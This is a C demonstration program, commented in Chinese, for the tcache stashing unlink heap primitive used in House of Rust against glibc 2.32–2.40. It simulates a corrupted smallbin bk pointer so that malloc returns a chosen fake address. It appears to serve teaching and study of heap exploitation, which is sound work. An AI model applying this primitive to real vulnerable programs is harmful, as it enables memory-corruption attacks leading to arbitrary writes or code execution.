/*
 * House of Rust 使用的标准 TSU 子原语，适用于 glibc 2.32～2.40。
 *
 * 漏洞模型：可以修改已经进入 smallbin 的 chunk->bk。
 * 成功效果：smallbin stashing 把伪节点放入 tcache，malloc 返回 fake[2]。
 */

#include <assert.h>
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    __attribute__((aligned(16))) size_t fake[16] = {0};
    size_t *chunk[9] = {0};
    size_t *result;

    setbuf(stdout, NULL);

    /* 九个 0x90 request 对应九个 0xa0 物理 chunk。 */
    for (int i = 0; i < 9; i++)
        chunk[i] = malloc(0x90);

    /* 先释放六个 chunk。 */
    for (int i = 3; i < 9; i++)
        free(chunk[i]);

    /* 第七次 free 填满这个尺寸的 tcache。 */
    free(chunk[1]);

    /* tcache 已满，chunk[0] 和 chunk[2] 进入 unsorted bin。 */
    free(chunk[0]);
    free(chunk[2]);

    /* 0xb0 物理大小的请求不能使用它们，会把它们分类进 0xa0 smallbin。 */
    malloc(0xa0);

    /* 取走两个 tcache 节点，为 stashing 留出两个槽位。 */
    malloc(0x90);
    malloc(0x90);

    /* fake[2] 是希望 malloc 返回的位置，fake[3] 对应伪节点的 bk。 */
    fake[3] = (size_t)&fake[2];

    /* 漏洞模拟：chunk[2][1] 正是 smallbin victim 的 bk。 */
    chunk[2][1] = (size_t)fake;

    /* calloc 触发 smallbin 解链和 tcache stashing。 */
    calloc(1, 0x90);

    /* 下一次 malloc 从 tcache 取出伪节点。 */
    result = malloc(0x90);

    assert(result == &fake[2]);
    printf("[+] TSU 返回目标\n");
    return 0;
}
